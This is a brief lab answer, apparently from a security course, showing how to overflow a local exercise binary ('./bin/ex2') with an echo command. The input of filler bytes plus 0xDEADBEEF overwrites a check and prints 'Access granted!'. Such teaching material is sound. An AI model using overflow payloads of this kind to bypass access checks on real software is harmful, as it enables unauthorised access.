# Lab 2 ex 2 q 4

**[Q4]**: How can we exploit the program just with `echo -ne`?

## Answer

```bash
echo -ne "12345678\xEF\xBE\xad\xDE" | ./bin/ex2
Access granted! # Output :)
```